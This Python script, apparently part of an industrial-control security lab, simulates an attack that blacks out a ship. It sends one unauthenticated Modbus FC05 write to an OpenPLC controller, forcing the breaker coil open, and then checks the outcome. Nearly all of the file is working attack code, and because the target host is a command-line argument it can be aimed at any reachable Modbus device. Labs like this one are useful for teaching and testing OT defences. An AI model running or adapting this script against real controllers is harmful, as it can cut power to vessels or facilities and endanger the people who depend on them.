"""
attack_scripts/atk02_breaker_manipulation.py
─────────────────────────────────────────────────────────────
ATK-02: BREAKER MANIPULATION

What this simulates:
  A single unauthorised Modbus write command forces the breaker
  coil to FALSE (OPEN). This is one of the most dangerous and
  simple OT attacks — Modbus FC05 has NO authentication.

  In a real Stuxnet-class attack, attackers first do
  reconnaissance on register maps, then issue targeted writes.
  This script demonstrates how trivially easy this is.

How it works:
  - One Modbus FC05 (Write Single Coil) command
  - Coil address 0 = %QX0.0 = breaker output
  - No password, no confirmation, no audit log in basic Modbus
  - Ship loses all power in under 100ms

Educational Simulation Only.
"""

import time
import sys
import argparse

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient


def run_attack(host="127.0.0.1", port=502):
    print("=" * 55)
    print("  ATK-02: BREAKER MANIPULATION")
    print("  Target: OpenPLC Runtime — Breaker Coil %QX0.0")
    print(f"  Host:   {host}:{port}")
    print("  Vector: Modbus FC05 Write Single Coil — no auth")
    print("  Effect: Instant ship blackout")
    print("  Educational simulation only.")
    print("=" * 55)

    client = ModbusTcpClient(host=host, port=port, timeout=3)
    if not client.connect():
        print(f"\n[!] Cannot connect to OpenPLC at {host}:{port}")
        sys.exit(1)

    print(f"\n[+] Connected to {host}:{port}")
    print("[*] Reading current breaker state...")

    coils = client.read_coils(0, count=3, slave=1)
    if not coils.isError():
        state = "CLOSED" if coils.bits[0] else "OPEN"
        print(f"[*] Current breaker state: {state}")

    print("\n[!] Sending rogue Modbus FC05 write...")
    print("    Coil 0 (%QX0.0 = BREAKER) → FALSE (OPEN)")

    result = client.write_coil(0, False, slave=1)  # coil 0 = breaker

    if result.isError():
        print(f"[!] Write failed: {result}")
    else:
        print("[+] Write SUCCESS — breaker forced OPEN")
        print("[+] Verifying...")
        time.sleep(0.3)

        verify = client.read_coils(0, count=3, slave=1)
        if not verify.isError():
            state   = "CLOSED" if verify.bits[0] else "OPEN"
            alarm   = "YES"    if verify.bits[1] else "NO"
            tripped = "YES"    if verify.bits[2] else "NO"
            print(f"\n    Breaker:      {state}")
            print(f"    Alarm active: {alarm}")
            print(f"    Relay tripped:{tripped}")

    print("\n[+] Attack complete.")
    print("    Check dashboard — ship should show BLACKOUT.")
    print("    To restore: click RESET SYSTEM in dashboard")
    print("    or run: python atk_reset.py")

    client.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ATK-02: Breaker Manipulation")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", default=502, type=int)
    args = parser.parse_args()
    run_attack(args.host, args.port)
